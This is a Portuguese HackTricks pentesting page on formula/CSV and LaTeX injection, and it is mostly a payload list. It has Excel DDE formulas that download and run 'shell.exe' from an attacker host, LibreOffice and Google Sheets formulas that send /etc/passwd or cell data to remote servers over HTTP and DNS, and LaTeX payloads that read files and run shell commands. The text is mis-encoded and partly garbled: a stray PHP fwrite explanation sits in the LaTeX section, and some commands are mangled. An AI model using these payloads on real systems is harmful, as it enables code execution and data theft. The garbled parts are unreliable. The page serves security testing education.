# Inje√ß√£o de F√≥rmula/CSV/Doc/LaTeX

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Inje√ß√£o de F√≥rmula

### Informa√ß√µes

Se a sua **entrada** est√° sendo **refletida** dentro de **arquivos CSV** (ou qualquer outro arquivo que provavelmente ser√° aberto pelo **Excel**), voc√™ pode ser capaz de colocar **f√≥rmulas do Excel** que ser√£o **executadas** quando o usu√°rio **abrir o arquivo** ou quando o usu√°rio **clicar em algum link** dentro da planilha do Excel.

{% hint style="danger" %}
Atualmente, o **Excel alertar√°** (v√°rias vezes) o **usu√°rio quando algo √© carregado de fora do Excel** para impedi-lo de realizar a√ß√µes maliciosas. Portanto, um esfor√ßo especial em Engenharia Social deve ser aplicado √† carga final.
{% endhint %}

### [Lista de palavras](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### Hiperlink

**O exemplo a seguir √© muito √∫til para exfiltrar conte√∫do da planilha final do Excel e realizar solicita√ß√µes para locais arbitr√°rios. Mas requer que o usu√°rio clique no link (e aceite as mensagens de aviso).**

Exemplo retirado de [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit)

Vamos assumir um cen√°rio de ataque ao sistema de Gerenciamento de Registros de Alunos de uma escola. O aplicativo permite que o professor insira detalhes dos alunos na escola. O atacante obt√©m acesso ao aplicativo e deseja que todos os professores que usam o aplicativo sejam comprometidos. Ent√£o, o atacante tenta realizar um ataque de inje√ß√£o de CSV por meio do aplicativo da web.\
O atacante precisa roubar os detalhes de outros alunos. Ent√£o, o atacante usa a f√≥rmula de Hiperlink e a insere ao inserir os detalhes do aluno.

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_008.png)

Quando o professor exporta o CSV e clica no hiperlink, os dados sens√≠veis s√£o enviados para o servidor do atacante.

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_009.png)

O arquivo CSV exportado cont√©m carga maliciosa nele.

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_010.png)

Os detalhes do aluno s√£o registrados no servidor web do atacante.

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_011.png)

### RCE

Para que este exemplo funcione, √© **necess√°rio ter habilitado a seguinte configura√ß√£o**:\
Arquivo ‚Üí Op√ß√µes ‚Üí Central de Confiabilidade ‚Üí Configura√ß√µes da Central de Confiabilidade ‚Üí Conte√∫do Externo ‚Üí Habilitar o Lan√ßamento do Servidor de Troca Din√¢mica de Dados\
ou o uso de uma **vers√£o antiga do Excel**.

A boa not√≠cia √© que **essa carga √© executada automaticamente quando o arquivo √© aberto** (se o usu√°rio aceitar as advert√™ncias).

√â poss√≠vel executar uma calculadora com a seguinte carga **`=cmd|' /C calc'!xxx`**

![](<../.gitbook/assets/image (25) (2) (2) (2) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (3).png>)

### Mais
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### LFI

**LibreOffice Calc**

* Isso ler√° a primeira linha do arquivo local /etc/passwd: `='file:///etc/passwd'#$passwd.A1`
* Exfiltr√°-lo: `=WEBSERVICE(CONCATENATE("http://:8080/",('file:///etc/passwd'#$passwd.A1)))`
* Exfiltrar mais de uma linha: `=WEBSERVICE(CONCATENATE("http://:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
* Exfiltra√ß√£o de DNS: `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),"."))`

**Analisando a carga de exfiltra√ß√£o de DNS:**

* ‚Äòfile:///etc/passwd‚Äô#$passwd.A19 - Ler√° a 19¬™ linha do arquivo local /etc/passwd
* ENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19) - Codifica em URL os dados retornados
* MID((ENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19)),1,41) - Similar a substring, l√™ dados do 1¬∫ caractere ao 41¬∫ - uma maneira muito √∫til de restringir o comprimento dos nomes de host DNS (limite de 254 caracteres em FQDN e 63 caracteres para um r√≥tulo, ou seja, subdom√≠nio)
* SUBSTITUTE(MID((ENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19)),1,41),‚Äù%‚Äù,‚Äù-‚Äú) - substitui todas as inst√¢ncias de % (o caractere especial da codifica√ß√£o de URL) por tra√ßo - isso garante que apenas caracteres DNS v√°lidos sejam usados
* CONCATENATE((SUBSTITUTE(MID((ENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19)),1,41),‚Äù%‚Äù,‚Äù-‚Äú)),‚Äù.\<FQDN>‚Äù) - Concatena a sa√≠da do arquivo (ap√≥s o processamento acima ter ocorrido) com o FQDN (para o qual temos acesso ao host que √© autorit√°rio para o dom√≠nio)
* WEBSERVICE - far√° uma solicita√ß√£o para este nome DNS inexistente, que podemos ent√£o analisar os logs (ou executar tcpdump etc.) no servidor de nome autorit√°rio DNS para o qual temos controle

### Google Sheets OOB Data Exfiltration

Em primeiro lugar, vamos apresentar algumas das fun√ß√µes mais interessantes.

**CONCATENATE**: Anexa strings umas √†s outras.
```
=CONCATENATE(A2:E2)
```
**IMPORTXML**: Importa dados de v√°rios tipos de dados estruturados, incluindo XML, HTML, CSV, TSV e feeds XML RSS e ATOM.
```
=IMPORTXML(CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")
```
**IMPORTFEED**: Importa um feed RSS ou ATOM.
```
=IMPORTFEED(CONCAT("http://[remote IP:Port]//123.txt?v=", CONCATENATE(A2:E2)))
```
**IMPORTHTML**: Importa dados de uma tabela ou lista dentro de uma p√°gina HTML.
```
=IMPORTHTML (CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)),"table",1)
```
**IMPORTRANGE**: Importa um intervalo de c√©lulas de uma planilha especificada.
```
=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")
```
**IMAGEM**: Insere uma imagem em uma c√©lula.
```
=IMAGE("https://[remote IP:Port]/images/srpr/logo3w.png")
```
## Inje√ß√£o de LaTeX

Geralmente, os servidores que encontramos na internet que **convertem c√≥digo LaTeX em PDF** usam o **`pdflatex`**. Este programa usa 3 atributos principais para permitir ou n√£o a execu√ß√£o de comandos:

* **`--no-shell-escape`**: **Desabilita** a constru√ß√£o `\write18{command}`, mesmo que esteja habilitada no arquivo texmf.cnf.
* **`--shell-restricted`**: Mesmo que `--shell-escape`, mas **limitado** a um conjunto 'seguro' de \*\*comandos predefinidos (\*\*No Ubuntu 16.04, a lista est√° em `/usr/share/texmf/web2c/texmf.cnf`).
* **`--shell-escape`**: **Habilita** a constru√ß√£o `\write18{command}`. O comando pode ser qualquer comando de shell. Essa constru√ß√£o √© normalmente desabilitada por motivos de seguran√ßa.

No entanto, existem outras maneiras de executar comandos, portanto, para evitar RCE, √© muito importante usar `--shell-restricted`.

### Ler arquivo <a href="#read-file" id="read-file"></a>
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### Ler arquivo de uma √∫nica linha
```bash
ewread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### Ler arquivo com v√°rias linhas
```bash
ewread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```
### Escrever arquivo <a href="#write-file" id="write-file"></a>

Para escrever um arquivo, podemos usar a fun√ß√£o `fwrite` do PHP. No entanto, se o arquivo n√£o existir, precisamos criar um novo arquivo primeiro. Podemos fazer isso usando a fun√ß√£o `fopen` com o modo `w` (write).

```php
$file = 'path/to/file.txt';
$data = 'conte√∫do do arquivo';

$handle = fopen($file, 'w');
fwrite($handle, $data);
fclose($handle);
```

Este c√≥digo criar√° um novo arquivo em `path/to/file.txt` e escrever√° o conte√∫do `conte√∫do do arquivo` nele. Se o arquivo j√° existir, ele ser√° sobrescrito.
```bash
ewwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### Execu√ß√£o de comando <a href="#command-execution" id="command-execution"></a>

A entrada do comando ser√° redirecionada para stdin, use um arquivo tempor√°rio para obt√™-lo.
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
Se voc√™ receber algum erro de LaTex, considere usar base64 para obter o resultado sem caracteres ruins.
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### Cross Site Scripting <a href="#cross-site-scripting" id="cross-site-scripting"></a>

De [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Refer√™ncias

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
